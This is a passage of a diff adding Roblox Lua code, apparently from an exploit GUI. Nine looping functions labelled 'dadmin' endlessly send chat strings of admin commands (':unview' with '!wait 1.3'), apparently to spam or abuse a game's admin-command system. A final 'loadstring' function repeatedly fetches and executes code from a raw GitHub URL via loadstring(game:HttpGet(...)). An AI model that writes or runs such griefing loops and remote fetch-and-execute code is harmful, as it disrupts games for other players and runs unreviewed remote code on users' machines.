+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(TYCJCNL_fake_script)()
+local function QDZDXB_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(QDZDXB_fake_script)()
+local function VDTSKUB_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(VDTSKUB_fake_script)()
+local function SHGZZ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(SHGZZ_fake_script)()
+local function WSOEHPK_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(WSOEHPK_fake_script)()
+local function HWAZ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(HWAZ_fake_script)()
+local function YKRHS_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(YKRHS_fake_script)()
+local function YEQJMEW_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(YEQJMEW_fake_script)()
+local function WAVS_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(WAVS_fake_script)()
+local function YRPE_fake_script() -- Frame.loadstring 
+	local script = Instance.new('LocalScript', Frame)
+
+	while task.wait() do	loadstring(game:HttpGet("https://raw.githubusercontent.com/Ximmingg/kpeuthginalizisation/refs/heads/main/kpdoesdolphin")) end
+	
+end
+coroutine.wrap(YRPE_fake_script)()
